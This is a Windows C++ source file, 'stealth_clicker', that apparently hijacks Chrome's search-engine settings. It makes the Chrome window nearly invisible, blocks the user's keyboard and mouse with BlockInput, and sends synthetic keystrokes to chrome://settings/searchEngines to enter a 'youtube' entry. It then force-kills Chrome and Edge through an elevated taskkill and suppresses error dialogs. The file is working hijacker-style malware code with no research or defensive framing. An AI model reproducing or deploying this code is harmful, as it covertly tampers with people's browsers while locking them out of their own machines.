// stealth_clicker.cpp

#include "stdafx.h"
#include "stealth_clicker.h"
#include <Windows.h>

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

///////////////////////////////////////////////////////////////////////////////////////////////

HANDLE p = NULL;
HWND wecosia = NULL;

HANDLE hThread1 = NULL;

int wait1 = 200;
int wait2 = 10;

static BOOL tstop1 = FALSE;

WCHAR AppPath[2048];
WCHAR AppPathBuf[2048];

static int alpha_value = 1;

///////////////////////////////////////////////////////////////////////////////////////////////


BOOL ShellExecuteSynched(LPWSTR verb, LPWSTR path, LPWSTR params, LPWSTR dir, int nShow, DWORD mil)
{
	// Launch the executable according to the following params 
	SHELLEXECUTEINFOW shex;
	memset(&shex, 0, sizeof(SHELLEXECUTEINFOW));
	shex.cbSize = sizeof(SHELLEXECUTEINFOW);
	shex.fMask = SEE_MASK_NOCLOSEPROCESS;
	shex.lpVerb = verb;
	shex.lpFile = path;
	shex.lpParameters = params;
	shex.lpDirectory = dir;
	shex.nShow = nShow;

	// Check that we were able to successfully launch the administrator utility application 
	if (!ShellExecuteEx(&shex))
	{
		//MessageBoxW(NULL, L"Could not launch executable", L"OTPS Error", MB_OK);
		return FALSE;
	}

	p = shex.hProcess;

	// Wait for the application to finish  
	WaitForSingleObject(shex.hProcess, mil);

	CloseHandle(shex.hProcess);

	return TRUE;

	/*
	//check the return code to make sure the utility app succeeded
	DWORD exitCode;
	if (GetExitCodeProcess(shex.hProcess, &exitCode) == FALSE)
	{
	AfxMessageBox(_T("FAIL TWO!"));
	return;
	}
	if (exitCode != 0)
	{
	AfxMessageBox(_T("FAIL THREE!"));
	}
	*/
}

BOOL ShellExecuteAsynched(LPWSTR verb, LPWSTR path, LPWSTR params, LPWSTR dir, int nShow)
{
	// Launch the executable according to the following params 
	SHELLEXECUTEINFOW shex;
	memset(&shex, 0, sizeof(SHELLEXECUTEINFOW));
	shex.cbSize = sizeof(SHELLEXECUTEINFOW);
	shex.fMask = SEE_MASK_NOCLOSEPROCESS;
	shex.lpVerb = verb;
	shex.lpFile = path;
	shex.lpParameters = params;
	shex.lpDirectory = dir;
	shex.nShow = nShow;

	// Check that we were able to successfully launch the administrator utility application 
	if (!ShellExecuteEx(&shex))
	{
		//MessageBoxW(NULL, L"Could not launch executable", L"OTPS Error", MB_OK);
		return FALSE;
	}

	p = shex.hProcess;

	CloseHandle(shex.hProcess);

	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////////

void stealthAllChromeWindows(BOOL stealth)
{
	HWND fw = FindWindowEx(NULL, NULL, L"Chrome_WidgetWin_1", NULL);

	WCHAR title[4096];
	ZeroMemory(title, 4096 * sizeof WCHAR);

	if (stealth)
	{
		SetWindowLong(fw, GWL_EXSTYLE, GetWindowLong(fw, GWL_EXSTYLE) | WS_EX_LAYERED);
		SetLayeredWindowAttributes(fw, 0, alpha_value, LWA_ALPHA);
	}
	else
	{
		SetLayeredWindowAttributes(fw, 0, 255, LWA_ALPHA);
		SetWindowLong(fw, GWL_EXSTYLE, GetWindowLong(fw, GWL_EXSTYLE) | WS_EX_APPWINDOW);
		SetWindowLong(fw, GWL_EXSTYLE, GetWindowLong(fw, GWL_EXSTYLE) & ~WS_EX_TOOLWINDOW);
	}

	SetForegroundWindow(fw);
	SetActiveWindow(fw);
	//BringWindowToTop(fw);

	SetFocus(fw);
	PostMessage(fw, WM_SETFOCUS, NULL, NULL);
	SendMessage(fw, WM_SETFOCUS, NULL, NULL);

}

///////////////////////////////////////////////////////////////////////////////////////////////

void hideThread1(void* pArguments)
{
	while (!tstop1)
	{

		//hideAllChromeWindows(TRUE);
		//Sleep(500);
		//Sleep(1);
		stealthAllChromeWindows(TRUE);
		Sleep(500);
	}

	//MessageBox(NULL, L"Thread 1 stopping!", L"Info", MB_OK);
}

///////////////////////////////////////////////////////////////////////////////////////////////

void typeUnicodeString(LPCWSTR text)
{
	if (!text || !*text)
		return;

	INPUT ip = {};
	ip.type = INPUT_KEYBOARD;
	ip.ki.wVk = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	for (const wchar_t* p = text; *p; ++p)
	{
		// Basic BMP characters (covers almost all URLs, English text, etc.)
		// Surrogate pairs (emoji, rare CJK, etc.) need extra handling if you ever need them.
		ip.ki.wScan = *p;
		ip.ki.dwFlags = KEYEVENTF_UNICODE;
		SendInput(1, &ip, sizeof(INPUT));

		ip.ki.dwFlags |= KEYEVENTF_KEYUP;
		SendInput(1, &ip, sizeof(INPUT));

		Sleep(wait2);   // reuse the delay you already have
	}
}

void addNewSearchProviderChrome()
{
	//MessageBox(NULL, L"Will add new search provider!", L"Info", MB_OK);

	INPUT ip;
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	//////////////////////////////////////////////////////////////////////////////////
	
	// Press CTRL+L 
	// Press the "Ctrl" key
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Press the "L" key
	ip.ki.wVk = 'L';
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "V" key
	ip.ki.wVk = 'L';
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);

	// Release the "Ctrl" key
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	//Sleep(1000);
	//////////////////////////////////////////////////////////////////////////////////

	typeUnicodeString(L"chrome://settings/searchEngines");
	
	//////////////////////////////////////////////////////////////////////////////////
	
	// Press the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	Sleep(1000);
	
	//////////////////////////////////////////////////////////////////////////////////
	
	// Press the "TAB" key first time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	//////////////////////////////////////////////////////////////////////////////////

	typeUnicodeString(L"youtube");

	//////////////////////////////////////////////////////////////////////////////////
	
	// Press the "TAB" key first time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	// Press the "TAB" key second time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	// Press the "TAB" key third time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	// Press the "TAB" key fourth time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	// Press the "TAB" key fifth time
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "TAB" key
	ip.ki.wVk = VK_TAB;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);

	//////////////////////////////////////////////////////////////////////////////////
	
	// Press the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	
	// Press the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait2);

	// Release the "ENTER" key
	ip.ki.wVk = VK_RETURN;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(wait1);
	Sleep(500);
	
	//////////////////////////////////////////////////////////////////////////////////
}

void closeCurrentTabs()
{
	INPUT ip = {};
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	// Ctrl + Shift + W  (Chrome: close current window / all tabs)
	// Press Ctrl
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait2);

	// Press Shift
	ip.ki.wVk = VK_SHIFT;
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait2);

	// Press W
	ip.ki.wVk = 'W';
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait2);

	// Release W
	ip.ki.wVk = 'W';
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait2);

	// Release Shift
	ip.ki.wVk = VK_SHIFT;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait2);

	// Release Ctrl
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(wait1);
}

BOOL getAppPath(PWCHAR AppPath)
{
	if (!GetModuleFileNameW(NULL, AppPath, 2048))
	{
		return FALSE;
	}

	PWCHAR pos = wcsrchr(AppPath, L'\\');

	*pos = L'\0';

	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////////

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	_set_abort_behavior(0, _WRITE_ABORT_MSG);

	//MessageBox(NULL, L"Will execute!", L"Info", MB_OK);

	if (!getAppPath(AppPath))
	{
		//MessageBox(NULL, L"Could not get app path", L"Error", MB_OK);
		return 1;
	}

	hThread1 = (HANDLE)_beginthread(hideThread1, 0, NULL);
	SetThreadPriority(hThread1, THREAD_PRIORITY_HIGHEST);
	
	Sleep(1000);

	tstop1 = TRUE;

	BlockInput(TRUE);

	addNewSearchProviderChrome();
	Sleep(500);

	closeCurrentTabs();

	ShellExecuteSynched(L"runas", L"taskkill", L"/F /T /IM chrome.exe", NULL, SW_HIDE, 5000);
	ShellExecuteSynched(L"runas", L"taskkill", L"/F /T /IM msedge.exe", NULL, SW_HIDE, 5000);

	BlockInput(FALSE);
	
	return 0;
}
